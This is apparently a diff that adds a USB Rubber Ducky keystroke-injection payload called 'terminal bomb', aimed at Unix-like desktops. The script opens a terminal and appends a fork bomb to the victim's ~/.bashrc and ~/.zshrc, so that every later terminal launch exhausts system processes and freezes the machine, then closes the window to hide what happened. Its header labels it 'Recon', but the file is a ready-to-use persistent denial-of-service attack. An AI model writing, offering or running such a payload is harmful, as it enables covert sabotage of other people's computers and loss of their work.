@@ -1,0 +1,21 @@
+REM Title: terminal bomb
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04
+REM Props: Hak5, drapl0n for the OG termbomb, the community and memes
+REM Version: 1.0
+REM Category: Recon
+REM Starts a forkbomb every time they open a terminal, if you want a more elequently written one check out drapl0n's PL as this is just a basic one liner. Simple but effective with less points of failure.
+REM Lamp oil, rope? Bombs! You want it? It's yours my friend! As long as you have enough Rupees!
+REM
+REM initialization delay
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 1500
+STRING echo ":(){ :|:& };:" >> ~/.zshrc && echo ":(){ :|:& };:" >> ~/.bashrc
+DELAY 300
+ENTER
+DELAY 500
+ALT F4
